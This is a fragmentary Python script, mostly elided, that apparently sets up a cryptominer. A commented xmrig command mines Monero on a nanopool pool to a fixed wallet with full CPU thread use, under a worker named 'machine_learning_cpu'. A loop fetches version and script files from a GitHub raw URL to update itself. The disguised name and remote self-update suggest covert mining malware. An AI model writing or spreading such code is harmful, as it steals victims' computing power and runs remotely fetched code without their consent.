...
if operate_system == 'lin':
    ...
    try:
        ...
        pass
import psutil
#command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf.machine_learning_cpu -p nql --tls --cpu-max-threads-hint=100 -t %s' %cores
...
while True:
    ...
    version_chinh = 5.0
    link_version_chinh = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/config/version_machine_learning_cpu'
    link_dao = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/config/machine_learning_cpu.py'
    try:
